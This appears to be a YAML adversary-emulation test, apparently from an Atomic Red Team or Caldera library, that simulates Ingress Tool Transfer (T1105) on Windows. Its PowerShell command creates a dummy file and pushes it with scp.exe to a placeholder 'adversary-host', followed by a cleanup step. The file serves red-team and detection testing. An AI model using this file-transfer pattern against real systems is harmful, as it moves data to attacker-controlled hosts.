- description: 'This test simulates pushing files using SCP on a Windows environment.

    '
  id: 476b7a43-030a-866b-7b33-489527c2d472
  name: Windows push file using scp.exe
  platforms:
    windows:
      psh:
        cleanup: '$filePath = Join-Path -Path "C:\temp" -ChildPath "T1105.txt"; Remove-Item
          -Path $filePath -Force -erroraction silentlycontinue; Write-Output "File
          deleted: $filePath"'
        command: '$folderPath = "C:\temp"; if (-Not (Test-Path -Path $folderPath))
          {;     New-Item -Path $folderPath -ItemType Directory; }; $filePath = Join-Path
          -Path $folderPath -ChildPath "T1105.txt"; New-Item -Path $filePath -ItemType
          File -Force; Write-Output "File created: $filePath"; scp.exe C:\temp\T1105.txt
          adversary@adversary-host:/tmp/'
        parsers:
          plugins.atomic.app.parsers.atomic_powershell:
          - source: validate_me
        payloads: []
  tactic: command-and-control
  technique:
    attack_id: T1105
    name: Ingress Tool Transfer
